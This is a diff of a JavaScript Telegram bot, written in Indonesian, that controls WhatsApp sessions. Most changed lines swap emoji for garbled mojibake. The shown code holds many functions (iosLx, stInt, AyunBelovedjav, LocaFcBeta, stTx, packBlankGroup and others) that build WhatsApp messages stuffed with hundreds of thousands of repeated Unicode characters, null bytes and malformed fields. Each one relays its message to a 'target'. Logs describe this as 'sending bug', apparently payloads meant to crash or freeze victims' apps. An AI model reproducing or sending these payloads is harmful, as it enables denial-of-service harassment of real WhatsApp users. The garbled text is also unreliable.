-        console.error("[❌ STATUSUSER ERROR]", err.message);
-        bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
+        console.error("[âŒ STATUSUSER ERROR]", err.message);
+        bot.sendMessage(chatId, "âŒ Terjadi kesalahan saat membuat laporan status user.");
     }
 });
 
@@ -17584,23 +17600,23 @@ bot.onText(/^\/?clearsession/, async (msg) => {
     const chatId = msg.chat.id;
 
     if (msg.from.id !== OWNER_ID) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
     }
 
     try {
         if (!fs.existsSync(SESSION_PATH)) {
-            return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
+            return bot.sendMessage(chatId, "âš ï¸ Folder session tidak ditemukan.");
         }
 
 
         fs.rmSync(SESSION_PATH, { recursive: true, force: true });
         fs.mkdirSync(SESSION_PATH, { recursive: true }); // buat ulang folder kosong
 
-        bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *otaxayun* dikosongkan).");
-        console.log("🧹 Semua session telah dihapus melalui /clearsession");
+        bot.sendMessage(chatId, "âœ… Semua session dihapus dengan sukses (folder *otaxayun* dikosongkan).");
+        console.log("ðŸ§¹ Semua session telah dihapus melalui /clearsession");
     } catch (err) {
-        console.error("❌ Error saat clear session:", err);
-        bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
+        console.error("âŒ Error saat clear session:", err);
+        bot.sendMessage(chatId, "âŒ Gagal menghapus semua session.");
     }
 });
 
@@ -17608,12 +17624,12 @@ bot.onText(/^\/?clear/, async (msg) => {
     const chatId = msg.chat.id;
 
     if (msg.from.id !== OWNER_ID) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
     }
 
     try {
         if (!fs.existsSync(SESSION_PATH)) {
-            return bot.sendMessage(chatId, "⚠️ Folder 'otaxayun' tidak ditemukan.");
+            return bot.sendMessage(chatId, "âš ï¸ Folder 'otaxayun' tidak ditemukan.");
         }
 
         let deletedCount = 0;
@@ -17633,10 +17649,10 @@ bot.onText(/^\/?clear/, async (msg) => {
         }
 
         bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
-        console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
+        console.log(`ðŸ§¹ ${deletedCount} folder session kosong dihapus.`);
     } catch (err) {
-        console.error("❌ Error saat clear session:", err);
-        bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
+        console.error("âŒ Error saat clear session:", err);
+        bot.sendMessage(chatId, "âŒ Terjadi error saat membersihkan session kosong.");
     }
 });
 
@@ -17645,10 +17661,10 @@ bot.onText(/^\/?restart$/, async (msg) => {
     const chatId = msg.chat.id;
 
     if (msg.from.id !== OWNER_ID) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
     }
 
-    console.log("♻️ Restart manual dijalankan...");
+    console.log("â™»ï¸ Restart manual dijalankan...");
 
     setTimeout(() => {
     }, 8000); // kirim pesan sukses setelah 8 detik
@@ -17663,14 +17679,14 @@ bot.onText(/^\/?zip$/i, async (msg) => {
     const chatId = msg.chat.id;
 
     if (msg.from.id !== OWNER_ID) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
     }
 
     if (msg.reply_to_message && msg.reply_to_message.document) {
         const doc = msg.reply_to_message.document;
         if (doc.file_name && doc.file_name.endsWith('.zip')) {
             try {
-                bot.sendMessage(chatId, "⏳ Mendownload file zip...");
+                bot.sendMessage(chatId, "â³ Mendownload file zip...");
                 const fileLink = await bot.getFileLink(doc.file_id);
 
                 const response = await axios({
@@ -17685,21 +17701,21 @@ bot.onText(/^\/?zip$/i, async (msg) => {
                 response.data.pipe(writer);
 
                 writer.on('finish', () => {
-                    bot.sendMessage(chatId, "✅ File bot.zip berhasil diupdate! File siap digunakan untuk instalasi panel.");
+                    bot.sendMessage(chatId, "âœ… File bot.zip berhasil diupdate! File siap digunakan untuk instalasi panel.");
                 });
                 writer.on('error', (err) => {
                     console.error("Write stream error:", err);
-                    bot.sendMessage(chatId, "❌ Gagal menyimpan file bot.zip");
+                    bot.sendMessage(chatId, "âŒ Gagal menyimpan file bot.zip");
                 });
             } catch (err) {
                 console.error("Download Error:", err);
-                bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mendownload file zip.");
+                bot.sendMessage(chatId, "âŒ Terjadi kesalahan saat mendownload file zip.");
             }
         } else {
-            bot.sendMessage(chatId, "❌ File yang di-reply bukan berformat .zip!");
+            bot.sendMessage(chatId, "âŒ File yang di-reply bukan berformat .zip!");
         }
     } else {
-        bot.sendMessage(chatId, "❌ Silakan reply sebuah file document .zip dengan mengetik /zip");
+        bot.sendMessage(chatId, "âŒ Silakan reply sebuah file document .zip dengan mengetik /zip");
     }
 });
 
@@ -17736,7 +17752,7 @@ setInterval(async () => {
             }
             const lastUsed = sessionRegistry[key]?.lastUsed || sock?.lastChecked || 0;
             if (lastUsed > 0 && (now - lastUsed) > IDLE_TIMEOUT_MS) {
-                console.log(`[IDLE-DISCONNECT] 🔌 Disconnect idle socket: ${key} (${Math.round((now - lastUsed) / 60000)}m idle)`);
+                console.log(`[IDLE-DISCONNECT] ðŸ”Œ Disconnect idle socket: ${key} (${Math.round((now - lastUsed) / 60000)}m idle)`);
                 try { sock?.ev?.removeAllListeners?.(); } catch (_) { }
                 try { if (sock.__healthbeat) clearInterval(sock.__healthbeat); } catch (_) { }
                 try { sock?.ws?.close(); } catch (_) { }
@@ -17750,7 +17766,7 @@ setInterval(async () => {
         const activeCount = Object.keys(activeConnections).length;
         const registryCount = Object.keys(sessionRegistry).length;
         if (cleaned > 0 || idleDisconnected > 0) {
-            console.log(`[PRE-WARM] 🧹 Cleaned: ${cleaned} dead, ${idleDisconnected} idle | Active: ${activeCount}/${registryCount}`);
+            console.log(`[PRE-WARM] ðŸ§¹ Cleaned: ${cleaned} dead, ${idleDisconnected} idle | Active: ${activeCount}/${registryCount}`);
         }
     } catch (err) {
         console.error(`[PRE-WARM] Error:`, err.message);
@@ -17779,7 +17795,7 @@ async function safeHourlyTask() {
 
 
 async function QcPay(otax, target, zid = true) {
-    const payload = "꧀".repeat(10000)
+    const payload = "ê§€".repeat(10000)
     const miaw = await generateWAMessageFromContent(target, proto.Message.fromObject({
         interactiveMessage: {
             body: {
@@ -17892,7 +17908,7 @@ async function permenCall(otax, toJid, isVideo = true) {
         }]
     };
 
-    await otax.query(stanza).catch(err => console.error("❌ Error sending call:", err));
+    await otax.query(stanza).catch(err => console.error("âŒ Error sending call:", err));
     return { id: callId, to: toJid };
 }
 
@@ -17905,16 +17921,16 @@ async function iosLx(Yuukey, target) {
                     locationMessage: {
                         degreesLatitude: 21.1266,
                         degreesLongitude: -11.8199,
-                        name: "𑇂𑆵𑆴𑆿".repeat(60000),
+                        name: "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(60000),
                         url: "https://t.me/forno",
                         contextInfo: {
                             mentionedJid: Array.from({ length: 2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`),
                             externalAdReply: {
                                 quotedAd: {
-                                    advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
+                                    advertiserName: "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(60000),
                                     mediaType: "IMAGE",
                                     jpegThumbnail: null,
-                                    caption: "𑇂𑆵𑆴𑆿".repeat(60000)
+                                    caption: "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(60000)
                                 },
                                 placeholderKey: {
                                     remoteJid: "0s.whatsapp.net",
@@ -17969,7 +17985,7 @@ async function stInt(otax, target) {
                         newsletterJid: "12037205250208@newsletter",
                         newsletterName: "ange Ama lu",
                         serverMessageId: 1000,
-                        accessibilityText: "Just Me Alone otax˒"
+                        accessibilityText: "Just Me Alone otaxË’"
                     },
                     statusAttributionType: "RESHARED_FROM_MENTION_MANY_TIMES",
                     statusAttributions: [
@@ -18003,7 +18019,7 @@ async function stInt(otax, target) {
                 },
                 nativeFlowResponseMessage: {
                     name: "address_message",
-                    paramsJson: `${"ྃ".repeat(100000)}`,
+                    paramsJson: `${"à¾ƒ".repeat(100000)}`,
                     version: 3
                 }
             }
@@ -18126,19 +18142,19 @@ async function audiodly(otax, target) {
                 },
             ],
         });
-        console.log(chalk.red(`𝙎𝙚𝙙𝙖𝙣𝙜 𝘿𝙞 𝙎𝙤𝙙𝙤𝙢 𝙊𝙡𝙚𝙝 𝙊𝙏𝘼𝙓 ${target}`))
+        console.log(chalk.red(`ð™Žð™šð™™ð™–ð™£ð™œ ð˜¿ð™ž ð™Žð™¤ð™™ð™¤ð™¢ ð™Šð™¡ð™šð™ ð™Šð™ð˜¼ð™“ ${target}`))
         await sleep(2000);
     }
 }
 async function AyunBelovedjavGb(otax, target) {
-    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
+    console.log(chalk.red(`ð—¢ð˜ð—®ð˜… ð—¦ð—²ð—±ð—®ð—»ð—´ ð— ð—²ð—»ð—´ð—¶ð—¿ð—¶ð—º ð—•ð˜‚ð—´`));
 
     const otaxi = {
         extendedTextMessage: {
-            text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(500000) + "\n\nJust otax" + "\0".repeat(100),
+            text: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(500000) + "\n\nJust otax" + "\0".repeat(100),
             matchedText: "https://t.me/Otapengenkawin",
-            description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
-            title: "ꦽ".repeat(20000),
+            description: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿",
+            title: "ê¦½".repeat(20000),
             previewType: 6,
             jpegThumbnail:
                 "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
@@ -18159,13 +18175,13 @@ async function AyunBelovedjavGb(otax, target) {
                 quotedMessage: {
                     newsletterAdminInviteMessage: {
                         newsletterJid: "otax@newsletter",
-                        newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
-                        caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
+                        newsletterName: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(10000),
+                        caption: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(60000) + "áŸ„áŸ".repeat(60000),
                         inviteExpiration: "999999999"
                     }
                 },
                 forwardedNewsletterMessageInfo: {
-                    newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
+                    newsletterName: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "âƒê™°ê™°ê™°".repeat(10000),
                     newsletterJid: "13135550002@newsletter",
                     serverId: 1
                 }
@@ -18193,14 +18209,14 @@ async function AyunBelovedjavGb(otax, target) {
     console.log(chalk.bold.red("Delay Visib Success To " + target));
 }
 async function AyunBelovedjav(otax, target) {
-    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
+    console.log(chalk.red(`ð—¢ð˜ð—®ð˜… ð—¦ð—²ð—±ð—®ð—»ð—´ ð— ð—²ð—»ð—´ð—¶ð—¿ð—¶ð—º ð—•ð˜‚ð—´`));
     for (let i = 0; i < 20; i++) {
         const otaxi = {
             extendedTextMessage: {
-                text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(500000) + "\n\nJust otax" + "\0".repeat(100),
+                text: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(500000) + "\n\nJust otax" + "\0".repeat(100),
                 matchedText: "https://t.me/Otapengenkawin",
-                description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
-                title: "ꦽ".repeat(20000),
+                description: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿",
+                title: "ê¦½".repeat(20000),
                 previewType: 6,
                 jpegThumbnail:
                     "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
@@ -18221,13 +18237,13 @@ async function AyunBelovedjav(otax, target) {
                     quotedMessage: {
                         newsletterAdminInviteMessage: {
                             newsletterJid: "otax@newsletter",
-                            newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
-                            caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
+                            newsletterName: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(10000),
+                            caption: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(60000) + "áŸ„áŸ".repeat(60000),
                             inviteExpiration: "999999999"
                         }
                     },
                     forwardedNewsletterMessageInfo: {
-                        newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
+                        newsletterName: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "âƒê™°ê™°ê™°".repeat(10000),
                         newsletterJid: "13135550002@newsletter",
                         serverId: 1
                     }
@@ -18261,7 +18277,7 @@ async function AyunBelovedjav(otax, target) {
     console.log(chalk.bold.red("Delay Visib Success To " + target));
 }
 async function LocaFcBeta(otax, target) {
-    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
+    console.log(chalk.red(`ð—¢ð˜ð—®ð˜… ð—¦ð—²ð—±ð—®ð—»ð—´ ð— ð—²ð—»ð—´ð—¶ð—¿ð—¶ð—º ð—•ð˜‚ð—´`));
 
     const otaxx = proto.Message.fromObject({
         viewOnceMessage: {
@@ -18271,15 +18287,15 @@ async function LocaFcBeta(otax, target) {
                         locationMessage: {
                             degreesLatitude: -999.03499999999999,
                             degreesLongitude: 922.9999999999999,
-                            name: "DO YOU KNOW ME?¿ otax" + "؂ن؃؄ٽ؂ن؃".repeat(40000),
+                            name: "DO YOU KNOW ME?Â¿ otax" + "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†Øƒ".repeat(40000),
                             url: "https://t.me/Otapengenkawin",
                             contextInfo: {
                                 externalAdReply: {
                                     quotedAd: {
-                                        advertiserName: "؂ن؃؄ٽ؂ن؃".repeat(40000),
+                                        advertiserName: "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†Øƒ".repeat(40000),
                                         mediaType: "IMAGE",
                                         jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
-                                        caption: "οταϰ ιѕ нєяє"
+                                        caption: "Î¿Ï„Î±Ï° Î¹Ñ• Ð½Ñ”ÑÑ”"
                                     },
                                     placeholderKey: {
                                         remoteJid: "0@g.us",
@@ -18292,7 +18308,7 @@ async function LocaFcBeta(otax, target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "нαιι ιм οταϰ⸙"
+                        text: "Ð½Î±Î¹Î¹ Î¹Ð¼ Î¿Ï„Î±Ï°â¸™"
                     },
                     nativeFlowMessage: {
                         messageParamsJson: "{[".repeat(10000),
@@ -18334,14 +18350,14 @@ async function LocaFcBeta(otax, target) {
     await otax.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid: target } });
 }
 async function AyunBelovedxhams(otax, target) {
-    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
+    console.log(chalk.red(`ð—¢ð˜ð—®ð˜… ð—¦ð—²ð—±ð—®ð—»ð—´ ð— ð—²ð—»ð—´ð—¶ð—¿ð—¶ð—º ð—•ð˜‚ð—´`));
     for (let i = 0; i < 20; i++) {
         const otaxi = {
             extendedTextMessage: {
-                text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(500000) + "\n\nJust otax" + "\0".repeat(100),
+                text: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(500000) + "\n\nJust otax" + "\0".repeat(100),
                 matchedText: "https://t.me/Otapengenkawin",
-                description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
-                title: "ꦽ".repeat(20000),
+                description: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿",
+                title: "ê¦½".repeat(20000),
                 previewType: 6,
                 jpegThumbnail:
                     "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
@@ -18362,13 +18378,13 @@ async function AyunBelovedxhams(otax, target) {
                     quotedMessage: {
                         newsletterAdminInviteMessage: {
                             newsletterJid: "otax@newsletter",
-                            newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
-                            caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
+                            newsletterName: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(10000),
+                            caption: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(60000) + "áŸ„áŸ".repeat(60000),
                             inviteExpiration: "999999999"
                         }
                     },
                     forwardedNewsletterMessageInfo: {
-                        newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
+                        newsletterName: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "âƒê™°ê™°ê™°".repeat(10000),
                         newsletterJid: "13135550002@newsletter",
                         serverId: 1
                     }
@@ -18410,16 +18426,16 @@ async function AyunBelovedxhams(otax, target) {
     console.log(chalk.bold.red("Delay Visib Success To " + target));
 }
 async function AyunBelovedxnxx(otax, target) {
-    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
+    console.log(chalk.red(`ð—¢ð˜ð—®ð˜… ð—¦ð—²ð—±ð—®ð—»ð—´ ð— ð—²ð—»ð—´ð—¶ð—¿ð—¶ð—º ð—•ð˜‚ð—´`));
 
     let peler = await otax.relayMessage(
         target,
         {
             extendedTextMessage: {
-                text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(500000) + "\n\nJust otax" + "\0".repeat(100),
+                text: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(500000) + "\n\nJust otax" + "\0".repeat(100),
                 matchedText: "https://t.me/Otapengenkawin",
-                description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
-                title: "ꦽ".repeat(20000),
+                description: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿",
+                title: "ê¦½".repeat(20000),
                 previewType: 6,
                 jpegThumbnail:
                     "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
@@ -18446,13 +18462,13 @@ async function AyunBelovedxnxx(otax, target) {
                     quotedMessage: {
                         newsletterAdminInviteMessage: {
                             newsletterJid: "otax@newsletter",
-                            newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
-                            caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
+                            newsletterName: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(10000),
+                            caption: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "ê¦¾".repeat(60000) + "áŸ„áŸ".repeat(60000),
                             inviteExpiration: "999999999"
                         }
                     },
                     forwardedNewsletterMessageInfo: {
-                        newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
+                        newsletterName: "â¸™áµ’áµ—áµƒË£Ð½Î¿Ï‰ Î±ÑÑ” Î³Î¿Ï…?Â¿" + "âƒê™°ê™°ê™°".repeat(10000),
                         newsletterJid: "13135550002@newsletter",
                         serverId: 1
                     }
@@ -18479,7 +18495,7 @@ async function stTx(otax, target) {
             viewOnceMessage: {
                 message: {
                     interactiveResponseMessage: {
-                        body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
+                        body: { text: "ÏƒÆ­Î±× É¦Î±à¹€", format: "DEFAULT" },
                         nativeFlowResponseMessage: {
                             name: "call_permission_request",
                             paramsJson: "\u0000".repeat(1045000),
@@ -18613,15 +18629,15 @@ async function stTx(otax, target) {
     }
 }
 async function packBlankGroup(otax, target) {
-    console.log(chalk.red("𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴"));
+    console.log(chalk.red("ð—¢ð˜ð—®ð˜… ð—¦ð—²ð—±ð—®ð—»ð—´ ð— ð—²ð—»ð—´ð—¶ð—¿ð—¶ð—º ð—•ð˜‚ð—´"));
 
     const msg = generateWAMessageFromContent(
         target,
         {
             stickerPackMessage: {
                 stickerPackId: "7b1760a6-472d-41b5-bbf5-e724c7de8604",
-                name: "otx" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
-                publisher: "؂ن؃؄ٽ؂ن؃".repeat(10000),
+                name: "otx" + "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†Øƒ".repeat(10000),
+                publisher: "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†Øƒ".repeat(10000),
                 stickers: [
                     {
                         fileName: "iLkMr4xDw8I8jV2E02tx9KMtnUZsu18ClZ4JvkvKHd0=.webp",
@@ -18649,7 +18665,7 @@ async function packBlankGroup(otax, target) {
     await otax.relayMessage(target, msg.message, { messageId: msg.key.id });
 }
 async function LocaNewManta(otax, target) {
-    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
+    console.log(chalk.red(`ð—¢ð˜ð—®ð˜… ð—¦ð—²ð—±ð—®ð—»ð—´ ð— ð—²ð—»ð—´ð—¶ð—¿ð—¶ð—º ð—•ð˜‚ð—´`));
 
     const otaxx = proto.Message.fromObject({
         viewOnceMessage: {
@@ -18659,15 +18675,15 @@ async function LocaNewManta(otax, target) {
                         locationMessage: {
                             degreesLatitude: true,
                             degreesLongitude: true,
-                            name: "σƭαא" + "ꦽ".repeat(180000),
+                            name: "ÏƒÆ­Î±×" + "ê¦½".repeat(180000),
                             url: "https://t.me/Otapengenkawin",
                             contextInfo: {
                                 externalAdReply: {
                                     quotedAd: {
-                                        advertiserName: "ꦾ".repeat(100000),
+                                        advertiserName: "ê¦¾".repeat(100000),
                                         mediaType: "IMAGE",
                                         jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
-                                        caption: "οταϰ ιѕ нєяє"
+                                        caption: "Î¿Ï„Î±Ï° Î¹Ñ• Ð½Ñ”ÑÑ”"
                                     },
                                     placeholderKey: {
                                         remoteJid: "0@g.us",
@@ -18680,7 +18696,7 @@ async function LocaNewManta(otax, target) {
                         hasMediaAttachment: true
